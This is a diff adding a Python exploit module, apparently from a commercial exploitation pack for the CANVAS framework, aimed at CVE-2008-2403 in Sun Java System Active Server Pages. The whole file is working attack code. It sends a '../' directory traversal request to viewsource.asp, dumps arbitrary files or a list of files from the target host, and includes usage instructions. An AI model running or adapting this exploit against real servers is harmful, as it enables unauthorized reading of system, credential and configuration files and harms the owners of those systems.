@@ -1,0 +1,129 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, time, os
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "Sun Java System Active Server Pages Directory Traversal"
+VERSION = "0.2"
+DESCRIPTION = "Sun Java System Active Server Pages Directory Traversal Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Solaris"] ]
+
+NOTES="""
+Argument flist: specify a file containing a list of files to dump
+"""
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "version 4.0.2"
+DOCUMENTATION["Date public"] = "2008/06/03"
+DOCUMENTATION["References"] = "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=707"
+DOCUMENTATION["CVE Name"] = "CVE-2008-2403"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2403"
+DOCUMENTATION["Notes"] = NOTES
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.host = ""
+		self.port = 5100 
+		self.file = ""
+		self.flist= ""
+		self.name = NAME
+		return
+	
+	def display_file(self, file):
+		try:
+			h = urlopen("http://%s:%d/caspsamp/shared/viewsource.asp?source=/caspsamp/../../../../../../../../../..%s" % (self.host, self.port, file))
+		except:
+			self.log("Can't read %s" % file)
+			return
+
+		data = h.readlines()
+
+		if len(data) > 0:
+			self.log("[!!] %s :" % file)
+
+			i = 0
+
+			for d in data:
+				if d.find("<!-- start source code -->") >= 0:
+					i = 1
+					continue
+				if d.find("<!-- end source code -->") >= 0:
+					i = 0
+				if i == 1:
+					d = d.replace("&nbsp;", " ")
+					d = d.replace("<br>", "")
+					self.log(d)
+		else:
+			self.log("%s empty" % file)
+		
+		self.log("\n")
+
+		return
+
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		self.file = self.argsDict.get("file",self.file)
+		self.flist = self.argsDict.get("flist",self.flist)
+		
+		if len(self.file) > 0 and len(self.flist) > 0:
+			self.log("You must only specify a file or a list of files")
+			self.setInfo("%s attacking %s:%d - failed" % (NAME,self.host,self.port))
+			return 1
+
+		if len(self.file) > 0:
+			self.display_file(self.file)
+		elif len(self.flist) > 0:
+			try:
+				f = open(self.flist, "r")
+			except:
+				self.log("Can't find %s" % self.flist)
+				self.setInfo("%s attacking %s:%d - failed" % (NAME,self.host,self.port))
+				return 1
+
+			flist = f.readlines()
+			f.close()
+
+			for file in flist:
+				file = file.strip()
+				self.display_file(file)
+
+		else:
+			self.log("No file or list of files specified")
+			self.setInfo("%s attacking %s:%d - failed" % (NAME,self.host,self.port))
+			return 1
+
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+
+		return 0
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:5100] -O file:<path> -O flist:<path>"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
